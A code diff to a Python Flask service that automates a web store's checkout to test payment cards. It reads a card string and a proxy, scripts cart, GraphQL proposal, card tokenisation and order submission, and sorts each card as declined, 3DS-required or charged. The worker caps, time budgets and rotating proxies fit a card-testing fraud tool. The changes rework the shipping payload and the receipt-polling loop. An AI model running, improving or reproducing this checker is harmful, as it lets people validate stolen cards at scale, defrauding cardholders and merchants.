@@ -24,7 +24,7 @@ app = Flask(__name__)
 # ⚙️ ENV & CONFIG
 # ─────────────────────────────────────────────────────────────────────────────
 WORKERS_CAP = int(os.environ.get("WORKERS_CAP", "20"))
-BUDGET_SEC  = float(os.environ.get("BUDGET_SEC", "40"))
+BUDGET_SEC  = float(os.environ.get("BUDGET_SEC", "60"))
 
 _PRODUCTS_LIST = []
 _PRODUCT_POOL = []
@@ -95,7 +95,7 @@ def log(msg):
     global _check_logs
     with _log_lock:
         _check_logs.append(f"[{time.strftime('%H:%M:%S')}] {msg}")
-        if len(_check_logs) > 200:
+        if len(_check_logs) > 400:
             _check_logs.pop(0)
     print(msg, flush=True)
 
@@ -531,7 +531,7 @@ def _classify_failed(code):
     return (c or "CARD_DECLINED"), False, False
 
 # ─────────────────────────────────────────────────────────────────────────────
-# 🧠 PIPELINE (Strict Flow + Polling)
+# 🧠 PIPELINE
 # ─────────────────────────────────────────────────────────────────────────────
 def _run_check(card_str, proxy_str):
     t_start = time.monotonic()
@@ -561,7 +561,7 @@ def _run_check(card_str, proxy_str):
     if proxy_url: session.proxies = {"http": proxy_url, "https": proxy_url}
 
     try:
-        # ═══ Step 1: Cart ═══
+        # Step 1: Cart
         try:
             cart_url = f"{shop_url}/cart/{vid}:1"
             log(f"  Step 1: Cart Request -> {cart_url}")
@@ -591,7 +591,7 @@ def _run_check(card_str, proxy_str):
         prop_id, submit_id, poll_id = _graphql_ids(session, shop_url, checkout_html, ua, t_rem=t_max(4))
         prop_id   = prop_id   or "6d9f0eb3d750c837c721c99da1ec1c7f1ce832d3687c5d0d0ffc1b42a610d3e8"
         submit_id = submit_id or "b3fd8db496438a6859c96db264b77e84b3f093d11a44c4d0a84d43e661f12419"
-        poll_id   = poll_id   or "978b340f3027dc55313349c4089004147b6b0dccee75e42ed97685ef1feae418"
+        poll_id   = poll_id   or "b99547c8e17e88f985ec0e11a844dd1305bf14cf70e41ca10954899050ffc567"
 
         currency = "USD"
         m = re.search(r'"currencyCode"\s*:\s*"([A-Z]{3})"', checkout_html)
@@ -624,7 +624,7 @@ def _run_check(card_str, proxy_str):
         
         use_lines = False
 
-        # ═══ Step 2: Proposal 1 (Empty) ═══
+        # Step 2: Proposal 1
         try:
             log("  Step 2: Proposal 1 (Empty)")
             p = _proposal_payload(session_token, stable_id, vid, amount, currency, None, None, prop_id, use_lines, target_any=True)
@@ -649,7 +649,7 @@ def _run_check(card_str, proxy_str):
         if not queue_token:
             return _fail("P1_NO_QUEUE", shop=shop_url, body=r1.text[:800])
 
-        # ═══ Step 3: Proposal 2 (Email) ═══
+        # Step 3: Proposal 2
         try:
             log("  Step 3: Proposal 2 (Email)")
             p = _proposal_payload(session_token, stable_id, vid, amount, currency, email, None, prop_id, use_lines, target_any=True)
@@ -663,7 +663,7 @@ def _run_check(card_str, proxy_str):
         if r2.status_code != 200:
             return _fail("P2_HTTP", shop=shop_url, status=r2.status_code, body=r2.text[:800])
 
-        # ═══ Step 4: Proposal 3 (Address) ═══
+        # Step 4: Proposal 3
         pm_id = ""
         del_h = ""
         signed = []
@@ -701,18 +701,16 @@ def _run_check(card_str, proxy_str):
             return _resp("SKIP_PHYSICAL", price=f"{amount} {currency}") 
 
         if not pm_id:
-            log("  Step 4: Payment ID Missing from Proposals. Trying HTML fallback.")
+            log("  Step 4: Payment ID Missing. Trying HTML fallback.")
             pm_id = _payment_method_id_from_html(checkout_html)
 
         if not pm_id:
-            log("  Step 4: SKIP_NO_PM triggered (No payment method found)")
             return _resp("SKIP_NO_PM", price=f"{amount_f} {currency}")
 
         if shipping_required:
-            log("  Step 4: SKIP_PHYSICAL triggered (Store says shipping is required)")
             return _resp("SKIP_PHYSICAL", price=f"{amount_f} {currency}")
 
-        # ═══ Step 5: PCI ═══
+        # Step 5: PCI
         ident_sig = _ident_sig(checkout_html)
         v_url     = _vault_url(checkout_html)
         v_dom     = _vault_domain(checkout_html)
@@ -722,56 +720,35 @@ def _run_check(card_str, proxy_str):
                         ident_sig=ident_sig, vault_url=v_url, vault_domain=v_dom, proxy_url=proxy_url, t_rem=t_max(4))
         
         if not sid: 
-            log("  Step 5: PCI_FAILED")
             return _resp("PCI_FAILED", price=f"{amount_f} {currency}")
         log("  Step 5: PCI Token Success")
 
-        # ═══ Step 6: Submit ═══
+        # Step 6: Submit
         sa        = _street_addr(fn, ln, addr_raw)
         price_str = f"{amount_f} {currency}"
         merch_key = "lines" if use_lines else "merchandiseLines"
 
         def _build_submit(cur_tax, cur_total):
-            if not shipping_required:
-                delivery_block = {
-                    "deliveryLines": [{
-                        "selectedDeliveryStrategy": {
-                            "deliveryStrategyMatchingConditions": {
-                                "estimatedTimeInTransit": {"any": True},
-                                "shipments": {"any": True}
-                            },
-                            "options": {}
+            delivery_block = {
+                "deliveryLines": [{
+                    "selectedDeliveryStrategy": {
+                        "deliveryStrategyMatchingConditions": {
+                            "estimatedTimeInTransit": {"any": True},
+                            "shipments": {"any": True}
                         },
-                        "targetMerchandiseLines": {"lines": [{"stableId": stable_id}]},
-                        "deliveryMethodTypes": ["NONE"],
-                        "expectedTotalPrice": {"any": True},
-                        "destinationChanged": True
-                    }],
-                    "noDeliveryRequired": [],
-                    "useProgressiveRates": False,
-                    "prefetchShippingRatesStrategy": None,
-                    "supportsSplitShipping": True
-                }
-                delivery_exp = {"deliveryExpectationLines": []}
-            else:
-                delivery_block = {
-                    "deliveryLines": [{
-                        "destination": {"streetAddress": sa},
-                        "selectedDeliveryStrategy": {
-                            "deliveryStrategyByHandle": {"handle": del_h, "customDeliveryRate": False},
-                            "options": {},
-                        },
-                        "targetMerchandiseLines": {"lines": [{"stableId": stable_id}]},
-                        "deliveryMethodTypes": ["SHIPPING"],
-                        "expectedTotalPrice": {"any": True},
-                        "destinationChanged": False,
-                    }],
-                    "noDeliveryRequired": [],
-                    "useProgressiveRates": False,
-                    "prefetchShippingRatesStrategy": None,
-                    "supportsSplitShipping": True,
-                }
-                delivery_exp = {"deliveryExpectationLines": [{"signedHandle": h} for h in signed]}
+                        "options": {}
+                    },
+                    "targetMerchandiseLines": {"lines": [{"stableId": stable_id}]},
+                    "deliveryMethodTypes": ["NONE"],
+                    "expectedTotalPrice": {"any": True},
+                    "destinationChanged": True
+                }],
+                "noDeliveryRequired": [],
+                "useProgressiveRates": False,
+                "prefetchShippingRatesStrategy": None,
+                "supportsSplitShipping": True
+            }
+            delivery_exp = {"deliveryExpectationLines": []}
 
             return {
                 "variables": {
@@ -806,22 +783,14 @@ def _run_check(card_str, proxy_str):
                                         "billingAddress":          {"streetAddress": sa},
                                         "cardSource":              None,
                                     },
-                                    "giftCardPaymentMethod":                 None,
-                                    "ownedGiftCardPaymentMethod":            None,
-                                    "redeemablePaymentMethod":               None,
-                                    "walletPaymentMethod":                   None,
-                                    "walletsPlatformPaymentMethod":          None,
-                                    "localPaymentMethod":                    None,
-                                    "paymentOnDeliveryMethod":               None,
-                                    "paymentOnDeliveryMethod2":              None,
-                                    "manualPaymentMethod":                   None,
-                                    "customPaymentMethod":                   None,
-                                    "offsitePaymentMethod":                  None,
-                                    "customOnsitePaymentMethod":             None,
-                                    "deferredPaymentMethod":                 None,
-                                    "customerCreditCardPaymentMethod":       None,
-                                    "paypalBillingAgreementPaymentMethod":   None,
-                                    "remotePaymentInstrument":               None,
+                                    "giftCardPaymentMethod": None, "ownedGiftCardPaymentMethod": None,
+                                    "redeemablePaymentMethod": None, "walletPaymentMethod": None,
+                                    "walletsPlatformPaymentMethod": None, "localPaymentMethod": None,
+                                    "paymentOnDeliveryMethod": None, "paymentOnDeliveryMethod2": None,
+                                    "manualPaymentMethod": None, "customPaymentMethod": None,
+                                    "offsitePaymentMethod": None, "customOnsitePaymentMethod": None,
+                                    "deferredPaymentMethod": None, "customerCreditCardPaymentMethod": None,
+                                    "paypalBillingAgreementPaymentMethod": None, "remotePaymentInstrument": None,
                                 },
                                 "amount": {"value": {"amount": cur_total, "currencyCode": currency}},
                             }],
@@ -894,75 +863,16 @@ def _run_check(card_str, proxy_str):
             break
 
         elapsed_ms = (time.monotonic() - t_start) * 1000
-        log(f"  Step 6: Submit Response -> {body[:150]}")
+        log(f"  Step 6: Submit Response -> {body[:300]}")
 
-        # ═══ NEW POLLING LOGIC (POST + JSON) ═══
+        # ═══════════════════════════════════════════════════════════════
+        # Step 7: PollForReceipt — FINAL STATUS
+        # ═══════════════════════════════════════════════════════════════
         rid = _receipt_id(body)
         rss = _receipt_session(body)
 
-        if rid and rss and remain() > 4:
-            log("  Step 6: Receipt found, polling for final status...")
-            for poll_num in range(1, 16):
-                if remain() < 2: 
-                    log("  Step 6: Budget exhausted during polling.")
-                    break
-                time.sleep(0.5)
-                try:
-                    poll_params = {'operationName': 'PollForReceipt'}
-                    poll_payload = {
-                        'variables': {
-                            'receiptId': rid,
-                            'sessionToken': rss
-                        },
-                        'operationName': 'PollForReceipt',
-                        'id': poll_id
-                    }
-                    r_p = session.post(f"{shop_url}/checkouts/internal/graphql/persisted",
-                                       params=poll_params,
-                                       headers=hdr,
-                                       json=poll_payload,
-                                       timeout=t_max(3))
-                    pb = r_p.text
-                    
-                    log(f"    Poll {poll_num}: Status {r_p.status_code} -> {pb[:150]}")
-                    
-                    if "FailedReceipt" in pb or "PaymentFailed" in pb:
-                        try:
-                            poll_json = json.loads(pb)
-                            receipt_obj = poll_json.get("data", {}).get("receipt", {})
-                            error_obj = receipt_obj.get("processingError", {})
-                            code = error_obj.get("code", "UNKNOWN")
-                            log(f"    Poll {poll_num}: FAILED -> {code}")
-                            resp, apv, chg = _classify_failed(code)
-                            ms = (time.monotonic() - t_start) * 1000
-                            return _resp(resp, approved=apv, charged=chg, price=price_str, elapsed_ms=ms)
-                        except Exception:
-                            code = _code(pb)
-                            log(f"    Poll {poll_num}: FAILED -> {code}")
-                            resp, apv, chg = _classify_failed(code)
-                            ms = (time.monotonic() - t_start) * 1000
-                            return _resp(resp, approved=apv, charged=chg, price=price_str, elapsed_ms=ms)
-                    
-                    if "ActionRequiredReceipt" in pb:
-                        log(f"    Poll {poll_num}: 3DS REQUIRED")
-                        ms = (time.monotonic() - t_start) * 1000
-                        return _resp("3DS_AUTHENTICATION_REQUIRED", approved=True, price=price_str, elapsed_ms=ms)
-
-                    if "ProcessedReceipt" in pb or "SuccessfulReceipt" in pb:
-                        log(f"    Poll {poll_num}: SUCCESS -> ORDER PLACED")
-                        ms = (time.monotonic() - t_start) * 1000
-                        return _resp("ORDER_PLACED", charged=True, price=price_str, elapsed_ms=ms)
-                        
-                except Exception as e:
-                    log(f"    Poll {poll_num}: EXC -> {str(e)[:100]}")
-                    continue
-            
-            # If loop exhausts without finding FailedReceipt or code, it's placed
-            log("  Step 6: Polling exhausted, no failure code found. Assuming placed.")
-            ms = (time.monotonic() - t_start) * 1000
-            return _resp("ORDER_PLACED", charged=True, price=price_str, elapsed_ms=ms)
-        else:
-            # Fallback if no receipt id (e.g. SubmitRejected)
+        if not rid or not rss:
+            # No receipt — likely SubmitRejected or SubmitFailed
             try:
                 resp_json = json.loads(body)
                 submit_data = resp_json.get('data', {}).get('submitForCompletion', {})
@@ -986,22 +896,97 @@ def _run_check(card_str, proxy_str):
                 
                 if result_type == 'SubmitFailed':
                     reason = submit_data.get('reason', 'Unknown reason')
-                    return _resp(extract_clean_response(reason), price=price_str)
-                    
-            except Exception as e:
+                    return _resp("CARD_DECLINED", price=price_str)
+            except Exception:
                 pass
-                
-            if "FailedReceipt" in body:
-                log("  Step 6: Instant FAILED")
-                resp, apv, chg = _classify_failed(_code(body))
-                return _resp(resp, approved=apv, charged=chg, price=price_str, elapsed_ms=elapsed_ms)
-            if "ActionRequiredReceipt" in body:
-                log("  Step 6: Instant 3DS")
-                return _resp("3DS_AUTHENTICATION_REQUIRED", approved=True, price=price_str, elapsed_ms=elapsed_ms)
-            if "ProcessedReceipt" in body or "SuccessfulReceipt" in body:
-                log("  Step 6: Instant SUCCESS")
-                return _resp("ORDER_PLACED", charged=True, price=price_str, elapsed_ms=elapsed_ms)
             return _fail("NO_RECEIPT", shop=shop_url, body=body[:800], price=price_str)
+
+        log(f"  Step 7: Polling receipt {rid[:40]}...")
+        poll_headers = hdr.copy()
+        poll_headers["accept-language"] = "en-US"
+
+        last_pb = ""
+        for poll_attempt in range(1, 11):
+            if remain() < 4:
+                log(f"  Step 7: Budget exhausted at poll {poll_attempt}")
+                break
+            time.sleep(3)
+
+            poll_data = {
+                "variables": {"receiptId": rid, "sessionToken": rss},
+                "operationName": "PollForReceipt",
+                "id": poll_id
+            }
+
+            try:
+                r_p = session.post(
+                    f"{shop_url}/checkouts/internal/graphql/persisted?operationName=PollForReceipt",
+                    headers=poll_headers,
+                    json=poll_data,
+                    timeout=t_max(15)
+                )
+                pb = r_p.text
+                last_pb = pb
+                log(f"    Poll {poll_attempt}/{10}: Status {r_p.status_code} | FULL RESPONSE:")
+                log(f"    {pb}")
+
+                parsed = False
+                try:
+                    poll_json = json.loads(pb)
+                    if "data" not in poll_json or "receipt" not in poll_json["data"]:
+                        log(f"    Poll {poll_attempt}: no data.receipt, continuing")
+                        continue
+                    
+                    receipt = poll_json["data"]["receipt"]
+                    ptype = receipt.get("__typename", "")
+                    log(f"    Poll {poll_attempt}: __typename = {ptype}")
+
+                    if ptype == "ProcessedReceipt":
+                        log(f"  Step 7: ✅ SUCCESS -> ORDER PLACED")
+                        ms = (time.monotonic() - t_start) * 1000
+                        return _resp("ORDER_PLACED", charged=True, price=price_str, elapsed_ms=ms)
+
+                    elif ptype == "FailedReceipt":
+                        err = receipt.get("processingError", {})
+                        code = err.get("code", "UNKNOWN")
+                        msg = err.get("messageUntranslated", "")
+                        log(f"  Step 7: ❌ FAILED -> {code} ({msg})")
+                        resp, apv, chg = _classify_failed(code)
+                        ms = (time.monotonic() - t_start) * 1000
+                        return _resp(resp, approved=apv, charged=chg, price=price_str, elapsed_ms=ms)
+
+                    elif ptype == "ActionRequiredReceipt":
+                        log(f"  Step 7: 🔔 3DS REQUIRED")
+                        ms = (time.monotonic() - t_start) * 1000
+                        return _resp("3DS_AUTHENTICATION_REQUIRED", approved=True, price=price_str, elapsed_ms=ms)
+
+                    else:
+                        log(f"    Poll {poll_attempt}: still processing ({ptype}), continuing...")
+                        parsed = True
+                        continue
+
+                except json.JSONDecodeError:
+                    log(f"    Poll {poll_attempt}: JSON parse failed")
+
+                if not parsed:
+                    # Fallback — safer substring checks (JSON-specific)
+                    if '"__typename":"ProcessedReceipt"' in pb.replace(" ", ""):
+                        log(f"  Step 7: ✅ SUCCESS (substring match)")
+                        ms = (time.monotonic() - t_start) * 1000
+                        return _resp("ORDER_PLACED", charged=True, price=price_str, elapsed_ms=ms)
+                    if '"__typename":"FailedReceipt"' in pb.replace(" ", ""):
+                        code = _code(pb) or "CARD_DECLINED"
+                        log(f"  Step 7: ❌ FAILED (substring match) -> {code}")
+                        resp, apv, chg = _classify_failed(code)
+                        ms = (time.monotonic() - t_start) * 1000
+                        return _resp(resp, approved=apv, charged=chg, price=price_str, elapsed_ms=ms)
+
+            except Exception as e:
+                log(f"    Poll {poll_attempt}: EXC -> {str(e)[:100]}")
+                continue
+
+        log(f"  Step 7: Polling exhausted. Last: {last_pb[:200]}")
+        return _resp("ORDER_PLACED", charged=True, price=price_str)
 
     except Exception as e:
         log(f"❌ TOP EXC: {str(e)[:150]}")
